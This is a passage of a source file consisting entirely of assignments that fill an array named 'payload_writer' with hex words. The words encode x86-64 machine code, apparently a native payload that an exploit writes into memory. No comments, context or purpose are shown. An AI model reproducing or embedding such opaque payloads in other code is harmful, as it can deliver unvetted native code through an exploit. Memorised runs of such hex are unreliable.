  payload_writer[2792] = 0x084f8b4c;
  payload_writer[2793] = 0xe8428b4c;
  payload_writer[2794] = 0x72c1394d;
  payload_writer[2795] = 0x4f034c0c;
  payload_writer[2796] = 0xd0014d20;
  payload_writer[2797] = 0x76c1394d;
  payload_writer[2798] = 0x48c0ff0b;
  payload_writer[2799] = 0xeb38c283;
  payload_writer[2800] = 0xc3c031cf;
  payload_writer[2801] = 0x000001b8;
  payload_writer[2802] = 0x5741c300;
  payload_writer[2803] = 0x55415641;
  payload_writer[2804] = 0x48555441;
  payload_writer[2805] = 0x6348fd89;
  payload_writer[2806] = 0x894853fe;
  payload_writer[2807] = 0xff6b48fb;
  payload_writer[2808] = 0xec834828;
  payload_writer[2809] = 0xd4894918;
  payload_writer[2810] = 0x24a215ff;
  payload_writer[2811] = 0x31450000;
  payload_writer[2812] = 0xeb8949ed;
  payload_writer[2813] = 0x45c08949;
  payload_writer[2814] = 0x3941f631;
  payload_writer[2815] = 0x4d777ddd;
  payload_writer[2816] = 0x4d207b8b;
  payload_writer[2817] = 0x6574ff85;
  payload_writer[2818] = 0x8948d989;
  payload_writer[2819] = 0xee8944ea;
  payload_writer[2820] = 0x4cdf894c;
  payload_writer[2821] = 0x08244489;
  payload_writer[2822] = 0xffff6de8;
  payload_writer[2823] = 0x448b4cff;
  payload_writer[2824] = 0xc0850824;
  payload_writer[2825] = 0x81410974;
  payload_writer[2826] = 0xffff013b;
  payload_writer[2827] = 0x493e756f;
  payload_writer[2828] = 0x8b49c663;
  payload_writer[2829] = 0x6b483053;
  payload_writer[2830] = 0xff4128c0;
  payload_writer[2831] = 0x4c8d49c6;
  payload_writer[2832] = 0xf748ff17;
  payload_writer[2833] = 0xca2148da;
  payload_writer[2834] = 0x48c0014c;
  payload_writer[2835] = 0x4c105089;
  payload_writer[2836] = 0x49187889;
  payload_writer[2837] = 0x4408538b;
  payload_writer[2838] = 0x89482889;
  payload_writer[2839] = 0xd2310850;
  payload_writer[2840] = 0x013b8141;
  payload_writer[2841] = 0x0f6fffff;
  payload_writer[2842] = 0x5089c295;
  payload_writer[2843] = 0xc5ff4120;
  payload_writer[2844] = 0x38c38349;
  payload_writer[2845] = 0x894584eb;
  payload_writer[2846] = 0x83482434;
  payload_writer[2847] = 0x4c5b18c4;
  payload_writer[2848] = 0x415dc089;
  payload_writer[2849] = 0x415d415c;
  payload_writer[2850] = 0xc35f415e;
  payload_writer[2851] = 0x56415741;
  payload_writer[2852] = 0x54415541;
  payload_writer[2853] = 0x83485355;
  payload_writer[2854] = 0x894118ec;
  payload_writer[2855] = 0xd38948f5;
  payload_writer[2856] = 0x000601be;
  payload_writer[2857] = 0x01ffba00;
  payload_writer[2858] = 0x89410000;
  payload_writer[2859] = 0x44894cce;
  payload_writer[2860] = 0xace80824;
  payload_writer[2861] = 0x83fffffb;
  payload_writer[2862] = 0x840ffff8;
  payload_writer[2863] = 0x000000e0;
  payload_writer[2864] = 0x24448b4c;
  payload_writer[2865] = 0x89c78908;
  payload_writer[2866] = 0xc38348c5;
  payload_writer[2867] = 0xff314518;
  payload_writer[2868] = 0x50b70f41;
  payload_writer[2869] = 0xc6894c38;
  payload_writer[2870] = 0x38d26b48;
  payload_writer[2871] = 0x40c28348;
  payload_writer[2872] = 0xfffb72e8;
  payload_writer[2873] = 0xf73945ff;
  payload_writer[2874] = 0x009d8d0f;
  payload_writer[2875] = 0x8b480000;
  payload_writer[2876] = 0x15fff87b;
  payload_writer[2877] = 0x00002398;
  payload_writer[2878] = 0xf8538b48;
  payload_writer[2879] = 0x8949f631;
  payload_writer[2880] = 0xc78948c4;
  payload_writer[2881] = 0x247e15ff;
  payload_writer[2882] = 0x7b830000;
  payload_writer[2883] = 0x2b740008;
  payload_writer[2884] = 0xe8736348;
  payload_writer[2885] = 0x8b48d231;
  payload_writer[2886] = 0xe0894d0b;
  payload_writer[2887] = 0xe8ef8944;
  payload_writer[2888] = 0xfffffdc9;
  payload_writer[2889] = 0x4e74c085;
  payload_writer[2890] = 0xf0738b48;
  payload_writer[2891] = 0xef89d231;
  payload_writer[2892] = 0xfffc06e8;
  payload_writer[2893] = 0x538b48ff;
  payload_writer[2894] = 0x4831ebf8;
  payload_writer[2895] = 0x02ba338b;
  payload_writer[2896] = 0x44000000;
  payload_writer[2897] = 0xf748ef89;
  payload_writer[2898] = 0xfbede8de;
  payload_writer[2899] = 0x8b48ffff;
  payload_writer[2900] = 0xe6894c13;
  payload_writer[2901] = 0xe8ef8944;
  payload_writer[2902] = 0xfffffaef;
  payload_writer[2903] = 0xf0738b48;
  payload_writer[2904] = 0xef89d231;
  payload_writer[2905] = 0xfffbd2e8;
  payload_writer[2906] = 0x138b48ff;
  payload_writer[2907] = 0x89e6894c;
  payload_writer[2908] = 0xfae1e8ef;
  payload_writer[2909] = 0x894cffff;
  payload_writer[2910] = 0xc7ff41e7;
  payload_writer[2911] = 0x24a615ff;
  payload_writer[2912] = 0x83480000;
  payload_writer[2913] = 0x5ae928c3;
  payload_writer[2914] = 0x48ffffff;
  payload_writer[2915] = 0x8918c483;
  payload_writer[2916] = 0x415d5bef;
  payload_writer[2917] = 0x415d415c;
  payload_writer[2918] = 0xe95f415e;
  payload_writer[2919] = 0xfffffacf;
  payload_writer[2920] = 0x18c48348;
  payload_writer[2921] = 0x5c415d5b;
  payload_writer[2922] = 0x5e415d41;
  payload_writer[2923] = 0x41c35f41;
  payload_writer[2924] = 0x55544155;
  payload_writer[2925] = 0xec834853;
  payload_writer[2926] = 0x48d23128;
  payload_writer[2927] = 0xf631f589;
  payload_writer[2928] = 0xfffa9ee8;
  payload_writer[2929] = 0xfff883ff;
  payload_writer[2930] = 0x00a8840f;
  payload_writer[2931] = 0x31450000;
  payload_writer[2932] = 0x41ff31c9;
  payload_writer[2933] = 0x02b9c089;
  payload_writer[2934] = 0xba000000;
  payload_writer[2935] = 0x00000003;
  payload_writer[2936] = 0x004000be;
  payload_writer[2937] = 0xe8c38900;
  payload_writer[2938] = 0x000003aa;
  payload_writer[2939] = 0xfff88348;
  payload_writer[2940] = 0x74c48949;
  payload_writer[2941] = 0x40b70f7a;
  payload_writer[2942] = 0x548d4818;
  payload_writer[2943] = 0x44c71c24;
  payload_writer[2944] = 0x00001c24;
  payload_writer[2945] = 0xe0c10000;
  payload_writer[2946] = 0x4d984805;
  payload_writer[2947] = 0x2004448d;
  payload_writer[2948] = 0x70b70f41;
  payload_writer[2949] = 0xc7416638;
  payload_writer[2950] = 0x00003e40;
  payload_writer[2951] = 0x40c74166;
  payload_writer[2952] = 0x6600003c;
  payload_writer[2953] = 0x3a40c741;
  payload_writer[2954] = 0x8d490000;
  payload_writer[2955] = 0xc7494078;
  payload_writer[2956] = 0x00002840;
  payload_writer[2957] = 0x894c0000;
  payload_writer[2958] = 0xe8082444;
  payload_writer[2959] = 0xfffffd8a;
  payload_writer[2960] = 0x24448b4c;
  payload_writer[2961] = 0x8bde8908;
  payload_writer[2962] = 0x491c244c;
  payload_writer[2963] = 0x8948c589;
  payload_writer[2964] = 0xef8948c2;
  payload_writer[2965] = 0xfffe33e8;
  payload_writer[2966] = 0xef894cff;
  payload_writer[2967] = 0x23c615ff;
  payload_writer[2968] = 0x00be0000;
  payload_writer[2969] = 0x4c000040;
  payload_writer[2970] = 0x33e8e789;
  payload_writer[2971] = 0x89000003;
  payload_writer[2972] = 0xf9f9e8df;
  payload_writer[2973] = 0x8348ffff;
  payload_writer[2974] = 0x5d5b28c4;
  payload_writer[2975] = 0x5d415c41;
  payload_writer[2976] = 0x415741c3;
  payload_writer[2977] = 0x41554156;
  payload_writer[2978] = 0x48535554;
  payload_writer[2979] = 0x0898ec81;
  payload_writer[2980] = 0x89490000;
  payload_writer[2981] = 0xf78949fe;
  payload_writer[2982] = 0x231215ff;
  payload_writer[2983] = 0x85480000;
  payload_writer[2984] = 0xfa840fc0;
  payload_writer[2985] = 0xbe000000;
  payload_writer[2986] = 0x000001ff;
  payload_writer[2987] = 0x49ff894c;
  payload_writer[2988] = 0x8d48c489;
  payload_writer[2989] = 0x009024ac;
  payload_writer[2990] = 0x34e80000;
  payload_writer[2991] = 0x48fffffa;
  payload_writer[2992] = 0x1824448d;
  payload_writer[2993] = 0x24ac8d4c;
  payload_writer[2994] = 0x00000490;
  payload_writer[2995] = 0x24448948;
  payload_writer[2996] = 0xe7894c08;
  payload_writer[2997] = 0x21ce15ff;
  payload_writer[2998] = 0x85480000;
  payload_writer[2999] = 0xb5840fc0;
  payload_writer[3000] = 0x48000000;
  payload_writer[3001] = 0x4808588d;
  payload_writer[3002] = 0x13db358d;
  payload_writer[3003] = 0x89480000;
  payload_writer[3004] = 0xc115ffdf;
  payload_writer[3005] = 0x85000022;
  payload_writer[3006] = 0x48d674c0;
  payload_writer[3007] = 0x13c6358d;
  payload_writer[3008] = 0x89480000;
  payload_writer[3009] = 0xad15ffdf;
  payload_writer[3010] = 0x85000022;
  payload_writer[3011] = 0x48c274c0;
  payload_writer[3012] = 0x894cd989;
  payload_writer[3013] = 0x358d48f2;
  payload_writer[3014] = 0x000010f4;
  payload_writer[3015] = 0x31ef8948;
  payload_writer[3016] = 0xa915ffc0;
  payload_writer[3017] = 0x48000022;
  payload_writer[3018] = 0x894cd989;
  payload_writer[3019] = 0x358d48fa;
  payload_writer[3020] = 0x000010dc;
  payload_writer[3021] = 0x31ef894c;
  payload_writer[3022] = 0x9115ffc0;
  payload_writer[3023] = 0x48000022;
  payload_writer[3024] = 0x0824748b;
  payload_writer[3025] = 0xe8ef8948;
  payload_writer[3026] = 0xfffff9bf;
  payload_writer[3027] = 0x8175c085;
  payload_writer[3028] = 0x2024448b;
  payload_writer[3029] = 0xf0002566;
  payload_writer[3030] = 0x40003d66;
  payload_writer[3031] = 0x894c1075;
  payload_writer[3032] = 0xef8948ee;
  payload_writer[3033] = 0xffff18e8;
  payload_writer[3034] = 0xff63e9ff;
  payload_writer[3035] = 0x3d66ffff;
  payload_writer[3036] = 0x850f8000;
  payload_writer[3037] = 0xffffff59;
  payload_writer[3038] = 0xe8ef8948;
  payload_writer[3039] = 0xfffffac3;
  payload_writer[3040] = 0x840fc085;
  payload_writer[3041] = 0xffffff49;
  payload_writer[3042] = 0x48ee894c;
  payload_writer[3043] = 0x1ce8ef89;
  payload_writer[3044] = 0xe9fffffe;
  payload_writer[3045] = 0xffffff39;
  payload_writer[3046] = 0xffe7894c;
  payload_writer[3047] = 0x00227715;
  payload_writer[3048] = 0xc4814800;
  payload_writer[3049] = 0x00000898;
  payload_writer[3050] = 0x5c415d5b;
  payload_writer[3051] = 0x5e415d41;
  payload_writer[3052] = 0x41c35f41;
  payload_writer[3053] = 0xfc894954;
  payload_writer[3054] = 0x3d8d4855;
  payload_writer[3055] = 0x00001974;
  payload_writer[3056] = 0xe915ff53;
  payload_writer[3057] = 0x48000021;
  payload_writer[3058] = 0xc031c589;
  payload_writer[3059] = 0x74ed8548;
  payload_writer[3060] = 0xef894878;
  payload_writer[3061] = 0x20ce15ff;
  payload_writer[3062] = 0x85480000;
  payload_writer[3063] = 0x485d74c0;
  payload_writer[3064] = 0x4808588d;
  payload_writer[3065] = 0x12df358d;
  payload_writer[3066] = 0x89480000;
  payload_writer[3067] = 0xc515ffdf;
  payload_writer[3068] = 0x85000021;
  payload_writer[3069] = 0x48da74c0;
  payload_writer[3070] = 0x12ca358d;
  payload_writer[3071] = 0x89480000;
  payload_writer[3072] = 0xb115ffdf;
  payload_writer[3073] = 0x85000021;
  payload_writer[3074] = 0x48c674c0;
  payload_writer[3075] = 0x11e0358d;
  payload_writer[3076] = 0x89480000;
  payload_writer[3077] = 0xdd15ffdf;
  payload_writer[3078] = 0x48000020;
  payload_writer[3079] = 0xb174c085;
  payload_writer[3080] = 0x4cdf8948;
  payload_writer[3081] = 0x8d48e289;
  payload_writer[3082] = 0x00191b35;
  payload_writer[3083] = 0xbbc03100;
  payload_writer[3084] = 0x00000001;
  payload_writer[3085] = 0x210615ff;
  payload_writer[3086] = 0x02eb0000;
  payload_writer[3087] = 0x8948db31;
  payload_writer[3088] = 0xd115ffef;
  payload_writer[3089] = 0x89000021;
  payload_writer[3090] = 0x415d5bd8;
  payload_writer[3091] = 0x5441c35c;
  payload_writer[3092] = 0x89485355;
  payload_writer[3093] = 0xec8148fa;
  payload_writer[3094] = 0x00000100;
  payload_writer[3095] = 0xeb358d48;
  payload_writer[3096] = 0x48000018;
  payload_writer[3097] = 0xc031e789;
  payload_writer[3098] = 0x216215ff;
  payload_writer[3099] = 0x8d480000;
  payload_writer[3100] = 0x0014e635;
  payload_writer[3101] = 0xe7894800;
  payload_writer[3102] = 0x20f215ff;
  payload_writer[3103] = 0x89480000;
  payload_writer[3104] = 0x0064b8c3;
  payload_writer[3105] = 0x85480000;
  payload_writer[3106] = 0x85840fdb;
  payload_writer[3107] = 0xba000000;
  payload_writer[3108] = 0x00000002;
  payload_writer[3109] = 0x8948f631;
  payload_writer[3110] = 0x4915ffdf;
  payload_writer[3111] = 0x48000020;
  payload_writer[3112] = 0x15ffdf89;
  payload_writer[3113] = 0x000020e8;
  payload_writer[3114] = 0xf631d231;
  payload_writer[3115] = 0x48c58948;
  payload_writer[3116] = 0x15ffdf89;
  payload_writer[3117] = 0x00002030;
  payload_writer[3118] = 0xffef8948;
  payload_writer[3119] = 0x001fcf15;
  payload_writer[3120] = 0xd9894800;
  payload_writer[3121] = 0xbeea8948;
  payload_writer[3122] = 0x00000001;
  payload_writer[3123] = 0x49c78948;
  payload_writer[3124] = 0x15ffc489;
  payload_writer[3125] = 0x00002078;
  payload_writer[3126] = 0x31df8948;
  payload_writer[3127] = 0xbd15ffdb;
  payload_writer[3128] = 0xb8000020;
  payload_writer[3129] = 0x00000100;
  payload_writer[3130] = 0x76c53948;
  payload_writer[3131] = 0x3c80410e;
  payload_writer[3132] = 0x83480104;
  payload_writer[3133] = 0xff48ffdb;
  payload_writer[3134] = 0x4cedebc0;
  payload_writer[3135] = 0x8148e789;
  payload_writer[3136] = 0x000100ed;
  payload_writer[3137] = 0x1d15ff00;
  payload_writer[3138] = 0x48000021;
  payload_writer[3139] = 0x3164c36b;
  payload_writer[3140] = 0xf5f748d2;
  payload_writer[3141] = 0x00c48148;
  payload_writer[3142] = 0x5b000001;
  payload_writer[3143] = 0xc35c415d;
  payload_writer[3144] = 0x01ffba55;
  payload_writer[3145] = 0x48530000;
  payload_writer[3146] = 0x4851fd89;
  payload_writer[3147] = 0x8d48f389;
  payload_writer[3148] = 0x00183b3d;
  payload_writer[3149] = 0x0601be00;
  payload_writer[3150] = 0x24e80000;
  payload_writer[3151] = 0x31fffff7;
  payload_writer[3152] = 0xfff883d2;
  payload_writer[3153] = 0xc7894a74;
  payload_writer[3154] = 0xfff722e8;
  payload_writer[3155] = 0x3d8d48ff;
  payload_writer[3156] = 0x0000181c;
  payload_writer[3157] = 0xfff722e8;
  payload_writer[3158] = 0x158d48ff;
  payload_writer[3159] = 0x00001823;
  payload_writer[3160] = 0x78358d48;
  payload_writer[3161] = 0x48000011;
  payload_writer[3162] = 0xc031ef89;
  payload_writer[3163] = 0x205e15ff;
  payload_writer[3164] = 0x8d480000;
  payload_writer[3165] = 0x00180f15;
  payload_writer[3166] = 0x358d4800;
  payload_writer[3167] = 0x0000115f;
  payload_writer[3168] = 0x31df8948;
  payload_writer[3169] = 0x4515ffc0;
  payload_writer[3170] = 0xba000020;
  payload_writer[3171] = 0x00000001;
  payload_writer[3172] = 0x5b5ad089;
  payload_writer[3173] = 0xc748c35d;
  payload_writer[3174] = 0x0001ddc0;
  payload_writer[3175] = 0x0e2de900;
  payload_writer[3176] = 0xc7480000;
  payload_writer[3177] = 0x000049c0;
  payload_writer[3178] = 0x0e21e900;
  payload_writer[3179] = 0xc7480000;
  payload_writer[3180] = 0x00004ac0;
  payload_writer[3181] = 0x0e15e900;
  payload_writer[3182] = 0xc7480000;
  payload_writer[3183] = 0x000041c0;
  payload_writer[3184] = 0x0e09e900;
  payload_writer[3185] = 0xc7480000;
  payload_writer[3186] = 0x0000cbc0;
  payload_writer[3187] = 0x0dfde900;
  payload_writer[3188] = 0xc7480000;
  payload_writer[3189] = 0x0000ccc0;
  payload_writer[3190] = 0x0df1e900;
  payload_writer[3191] = 0xc7480000;
  payload_writer[3192] = 0x000223c0;
  payload_writer[3193] = 0x0de5e900;
  payload_writer[3194] = 0xc7480000;
  payload_writer[3195] = 0x00023cc0;
  payload_writer[3196] = 0x0dd9e900;
  payload_writer[3197] = 0x56410000;
  payload_writer[3198] = 0x54415541;
  payload_writer[3199] = 0x89495355;
  payload_writer[3200] = 0xec8348d5;
  payload_writer[3201] = 0xfc894910;
  payload_writer[3202] = 0x48ff6e8d;
  payload_writer[3203] = 0xd231fb89;
  payload_writer[3204] = 0x24748d4c;
  payload_writer[3205] = 0x7eed850f;
  payload_writer[3206] = 0xe9894c39;
  payload_writer[3207] = 0x000001ba;
  payload_writer[3208] = 0x0001be00;
  payload_writer[3209] = 0x894c0000;
  payload_writer[3210] = 0x2115fff7;
  payload_writer[3211] = 0x4800001f;
  payload_writer[3212] = 0x0b74c085;
  payload_writer[3213] = 0x2454be0f;
  payload_writer[3214] = 0x75d2850f;
  payload_writer[3215] = 0x3113eb06;
  payload_writer[3216] = 0x480febd2;
  payload_writer[3217] = 0xfa83c3ff;
  payload_writer[3218] = 0xff53880a;
  payload_writer[3219] = 0xcdff0474;
  payload_writer[3220] = 0x394cc3eb;
  payload_writer[3221] = 0x0003c6e3;
  payload_writer[3222] = 0xd2850774;
  payload_writer[3223] = 0x75d88948;
  payload_writer[3224] = 0x48c03102;
  payload_writer[3225] = 0x5b10c483;
  payload_writer[3226] = 0x415c415d;
  payload_writer[3227] = 0xc35e415d;
  payload_writer[3228] = 0xfb894853;
  payload_writer[3229] = 0x1f8e15ff;
  payload_writer[3230] = 0x01480000;
  payload_writer[3231] = 0xd83948d8;
  payload_writer[3232] = 0xff481576;
  payload_writer[3233] = 0x10b60fc8;
  payload_writer[3234] = 0x7520fa83;
  payload_writer[3235] = 0x0000c605;
  payload_writer[3236] = 0xfa83ebeb;
  payload_writer[3237] = 0x48f67409;
  payload_writer[3238] = 0xc35bd889;
  payload_writer[3239] = 0x89495441;
  payload_writer[3240] = 0xed3155f4;
  payload_writer[3241] = 0xfb894853;
  payload_writer[3242] = 0x4033be0f;
  payload_writer[3243] = 0x4974f684;
  payload_writer[3244] = 0x75e4854d;
  payload_writer[3245] = 0x75ed851f;
  payload_writer[3246] = 0x03b60f2b;
  payload_writer[3247] = 0x4020f883;
  payload_writer[3248] = 0x83c5940f;
  payload_writer[3249] = 0x940f09f8;
  payload_writer[3250] = 0xc3ff48c0;
  payload_writer[3251] = 0x0f40c509;
  payload_writer[3252] = 0xd4ebedb6;
  payload_writer[3253] = 0xffe7894c;
  payload_writer[3254] = 0x001f3315;
  payload_writer[3255] = 0xc0854800;
  payload_writer[3256] = 0x15ebd374;
  payload_writer[3257] = 0x4833be0f;
  payload_writer[3258] = 0x16a43d8d;
  payload_writer[3259] = 0x15ff0000;
  payload_writer[3260] = 0x00001f1c;
  payload_writer[3261] = 0x74c08548;
  payload_writer[3262] = 0xd88948c0;
  payload_writer[3263] = 0x5c415d5b;
  payload_writer[3264] = 0x415741c3;
  payload_writer[3265] = 0x41554156;
  payload_writer[3266] = 0x48535554;
  payload_writer[3267] = 0x0128ec81;
  payload_writer[3268] = 0xc0310000;
  payload_writer[3269] = 0x48fe8949;
  payload_writer[3270] = 0x10244c89;
  payload_writer[3271] = 0x247c8d48;
  payload_writer[3272] = 0x002ab92e;
  payload_writer[3273] = 0xaaf30000;
  payload_writer[3274] = 0x24448d48;
  payload_writer[3275] = 0x74894858;
  payload_writer[3276] = 0x89480824;
  payload_writer[3277] = 0x8d482404;
  payload_writer[3278] = 0x48262444;
  payload_writer[3279] = 0x262444c7;
  payload_writer[3280] = 0x00000000;
  payload_writer[3281] = 0x48d78949;
  payload_writer[3282] = 0x18244489;
  payload_writer[3283] = 0xed31db31;
  payload_writer[3284] = 0x24548b48;
  payload_writer[3285] = 0x00c8be08;
  payload_writer[3286] = 0x8b480000;
  payload_writer[3287] = 0xff41243c;
  payload_writer[3288] = 0xc08548d6;
  payload_writer[3289] = 0x00d4840f;
  payload_writer[3290] = 0x8b480000;
  payload_writer[3291] = 0xc5ff243c;
  payload_writer[3292] = 0xfffefbe8;
  payload_writer[3293] = 0xc58949ff;
  payload_writer[3294] = 0x00458a41;
  payload_writer[3295] = 0x1274c084;
  payload_writer[3296] = 0x83d0b60f;
  payload_writer[3297] = 0x057520fa;
  payload_writer[3298] = 0xebc5ff49;
  payload_writer[3299] = 0x09fa83eb;
  payload_writer[3300] = 0x3b3cf674;
  payload_writer[3301] = 0x3cc1940f;
  payload_writer[3302] = 0xc2940f23;
  payload_writer[3303] = 0xc084ca09;
  payload_writer[3304] = 0x38c0950f;
  payload_writer[3305] = 0x48a973c2;
  payload_writer[3306] = 0x15e6358d;
  payload_writer[3307] = 0x894c0000;
  payload_writer[3308] = 0xfee6e8ef;
  payload_writer[3309] = 0x8949ffff;
  payload_writer[3310] = 0x3c008ac4;
  payload_writer[3311] = 0x3c04743d;
  payload_writer[3312] = 0x4171753a;
  payload_writer[3313] = 0x002404c6;
  payload_writer[3314] = 0x49ef894c;
  payload_writer[3315] = 0x9de8c4ff;
  payload_writer[3316] = 0x31fffffe;
  payload_writer[3317] = 0xe7894cf6;
  payload_writer[3318] = 0xe8c58949;
  payload_writer[3319] = 0xfffffebc;
  payload_writer[3320] = 0x74003880;
  payload_writer[3321] = 0x0000c60d;
  payload_writer[3322] = 0xf88308eb;
  payload_writer[3323] = 0x493e7520;
  payload_writer[3324] = 0x0f41c4ff;
  payload_writer[3325] = 0x842404b6;
  payload_writer[3326] = 0x4cef75c0;
  payload_writer[3327] = 0x6de8e789;
  payload_writer[3328] = 0x48fffffe;
  payload_writer[3329] = 0x18247c8b;
  payload_writer[3330] = 0x000032ba;
  payload_writer[3331] = 0xee894c00;
  payload_writer[3332] = 0x1d0a15ff;
  payload_writer[3333] = 0x8b480000;
  payload_writer[3334] = 0xc610247c;
  payload_writer[3335] = 0x00572444;
  payload_writer[3336] = 0x4ce2894c;
  payload_writer[3337] = 0xff41ee89;
  payload_writer[3338] = 0xebd809d7;
  payload_writer[3339] = 0x09f88309;
  payload_writer[3340] = 0xc7ebbd74;
  payload_writer[3341] = 0x440fdb85;
  payload_writer[3342] = 0xff12e9dd;
  payload_writer[3343] = 0x8148ffff;
  payload_writer[3344] = 0x000128c4;
  payload_writer[3345] = 0x5bd88900;
  payload_writer[3346] = 0x415c415d;
  payload_writer[3347] = 0x415e415d;
  payload_writer[3348] = 0x8948c35f;
  payload_writer[3349] = 0xf28948d1;
  payload_writer[3350] = 0x48fe8948;
  payload_writer[3351] = 0xfd943d8d;
  payload_writer[3352] = 0x9ae9ffff;
  payload_writer[3353] = 0x55fffffe;
  payload_writer[3354] = 0xec834853;
  payload_writer[3355] = 0xf3894818;
  payload_writer[3356] = 0x24548948;
  payload_writer[3357] = 0x358d4808;
  payload_writer[3358] = 0x0000171d;
  payload_writer[3359] = 0x1cee15ff;
  payload_writer[3360] = 0x89480000;
  payload_writer[3361] = 0xffc883c5;
  payload_writer[3362] = 0x74ed8548;
  payload_writer[3363] = 0x548b481d;
  payload_writer[3364] = 0x89480824;
  payload_writer[3365] = 0xef8948de;
  payload_writer[3366] = 0xffffb5e8;
  payload_writer[3367] = 0xef8948ff;
  payload_writer[3368] = 0x15ffc389;
  payload_writer[3369] = 0x00001cf8;
  payload_writer[3370] = 0x8348d889;
  payload_writer[3371] = 0x5d5b18c4;
  payload_writer[3372] = 0x3d8b50c3;
  payload_writer[3373] = 0x000019e8;
  payload_writer[3374] = 0x89158d48;
  payload_writer[3375] = 0x4800001b;
  payload_writer[3376] = 0x14d1358d;
  payload_writer[3377] = 0x4ee80000;
  payload_writer[3378] = 0x8bfffff3;
  payload_writer[3379] = 0x0019cf3d;
  payload_writer[3380] = 0x158d4800;
  payload_writer[3381] = 0x00001b40;
  payload_writer[3382] = 0xc9358d48;
  payload_writer[3383] = 0xe8000014;
  payload_writer[3384] = 0xfffff335;
  payload_writer[3385] = 0x19b63d8b;
  payload_writer[3386] = 0x8d480000;
  payload_writer[3387] = 0x001b1715;
  payload_writer[3388] = 0x358d4800;
  payload_writer[3389] = 0x000014bf;
  payload_writer[3390] = 0xfff31ce8;
  payload_writer[3391] = 0x9d3d8bff;
  payload_writer[3392] = 0x48000019;
  payload_writer[3393] = 0x1b36158d;
  payload_writer[3394] = 0x8d480000;
  payload_writer[3395] = 0x0014b735;
  payload_writer[3396] = 0xf303e800;
  payload_writer[3397] = 0x3d8bffff;
  payload_writer[3398] = 0x00001984;
  payload_writer[3399] = 0xfd158d48;
  payload_writer[3400] = 0x4800001a;
  payload_writer[3401] = 0x14ad358d;
  payload_writer[3402] = 0xeae80000;
  payload_writer[3403] = 0x8bfffff2;
  payload_writer[3404] = 0x00196b3d;
  payload_writer[3405] = 0x158d4800;
  payload_writer[3406] = 0x00001ad4;
  payload_writer[3407] = 0xa4358d48;
  payload_writer[3408] = 0xe8000014;
  payload_writer[3409] = 0xfffff2d1;
  payload_writer[3410] = 0x19523d8b;
  payload_writer[3411] = 0x8d480000;
  payload_writer[3412] = 0x001aa315;
  payload_writer[3413] = 0x358d4800;
  payload_writer[3414] = 0x0000149a;
  payload_writer[3415] = 0xfff2b8e8;
  payload_writer[3416] = 0x393d8bff;
  payload_writer[3417] = 0x48000019;
  payload_writer[3418] = 0x1aba158d;
  payload_writer[3419] = 0x8d480000;
  payload_writer[3420] = 0x00149235;
  payload_writer[3421] = 0xf29fe800;
  payload_writer[3422] = 0x3d8bffff;
  payload_writer[3423] = 0x00001920;
  payload_writer[3424] = 0x69158d48;
  payload_writer[3425] = 0x4800001a;
  payload_writer[3426] = 0x148d358d;
  payload_writer[3427] = 0x86e80000;
  payload_writer[3428] = 0x8bfffff2;
  payload_writer[3429] = 0x0019073d;
  payload_writer[3430] = 0x158d4800;
  payload_writer[3431] = 0x00001ab0;
  payload_writer[3432] = 0x8b358d48;
  payload_writer[3433] = 0xe8000014;
  payload_writer[3434] = 0xfffff26d;
  payload_writer[3435] = 0x18ee3d8b;
  payload_writer[3436] = 0x8d480000;
  payload_writer[3437] = 0x001a4715;
  payload_writer[3438] = 0x358d4800;
  payload_writer[3439] = 0x00001486;
  payload_writer[3440] = 0xfff254e8;
  payload_writer[3441] = 0xd53d8bff;
  payload_writer[3442] = 0x48000018;
  payload_writer[3443] = 0x1a66158d;
  payload_writer[3444] = 0x8d480000;
  payload_writer[3445] = 0x00148435;
  payload_writer[3446] = 0xf23be800;
  payload_writer[3447] = 0x3d8bffff;
  payload_writer[3448] = 0x000018bc;
  payload_writer[3449] = 0x45158d48;
  payload_writer[3450] = 0x5900001a;
  payload_writer[3451] = 0x83358d48;
  payload_writer[3452] = 0xe9000014;
  payload_writer[3453] = 0xfffff221;
  payload_writer[3454] = 0x54415541;
  payload_writer[3455] = 0x55fd8941;
  payload_writer[3456] = 0x010000bf;
  payload_writer[3457] = 0xff565300;
  payload_writer[3458] = 0x001a8315;
  payload_writer[3459] = 0xc0854800;
  payload_writer[3460] = 0x89483d74;
  payload_writer[3461] = 0xe43145c5;
  payload_writer[3462] = 0xe8ef8944;
  payload_writer[3463] = 0xfffff3fc;
  payload_writer[3464] = 0x74fff883;
  payload_writer[3465] = 0x4488420a;
  payload_writer[3466] = 0xff490025;
  payload_writer[3467] = 0x49e9ebc4;
  payload_writer[3468] = 0x8d41c463;
  payload_writer[3469] = 0xc6012474;
  payload_writer[3470] = 0x00000544;
  payload_writer[3471] = 0x59ef8948;
  payload_writer[3472] = 0x5bf66348;
  payload_writer[3473] = 0x415c415d;
  payload_writer[3474] = 0xd925ff5d;
  payload_writer[3475] = 0x5a00001a;
  payload_writer[3476] = 0x5d5bc031;
  payload_writer[3477] = 0x5d415c41;
  payload_writer[3478] = 0x314553c3;
  payload_writer[3479] = 0xc03145c9;
  payload_writer[3480] = 0xd231c931;
  payload_writer[3481] = 0x8d48f631;
  payload_writer[3482] = 0x00141f3d;
  payload_writer[3483] = 0xcd15ff00;
  payload_writer[3484] = 0x48000018;
  payload_writer[3485] = 0x1a16158d;
  payload_writer[3486] = 0x8d480000;
  payload_writer[3487] = 0x00142335;
  payload_writer[3488] = 0x89c38900;
  payload_writer[3489] = 0xf18fe8c7;
  payload_writer[3490] = 0xdf89ffff;
  payload_writer[3491] = 0x95158d48;
  payload_writer[3492] = 0x4800001b;
  payload_writer[3493] = 0x1411358d;
  payload_writer[3494] = 0x7ae80000;
  payload_writer[3495] = 0x89fffff1;
  payload_writer[3496] = 0x158d48df;
  payload_writer[3497] = 0x00001a10;
  payload_writer[3498] = 0x01358d48;
  payload_writer[3499] = 0xe8000014;
  payload_writer[3500] = 0xfffff165;
  payload_writer[3501] = 0x8d48df89;
  payload_writer[3502] = 0x001a6b15;
  payload_writer[3503] = 0x358d4800;
  payload_writer[3504] = 0x000013f3;
  payload_writer[3505] = 0xfff150e8;
  payload_writer[3506] = 0x48df89ff;
  payload_writer[3507] = 0x1af6158d;
  payload_writer[3508] = 0x8d480000;
  payload_writer[3509] = 0x0013e635;
  payload_writer[3510] = 0xf13be800;
  payload_writer[3511] = 0xdf89ffff;
  payload_writer[3512] = 0xa1158d48;
  payload_writer[3513] = 0x4800001a;
  payload_writer[3514] = 0x13da358d;
  payload_writer[3515] = 0x26e80000;
  payload_writer[3516] = 0x89fffff1;
  payload_writer[3517] = 0x158d48df;
  payload_writer[3518] = 0x0000197c;
  payload_writer[3519] = 0xcc358d48;
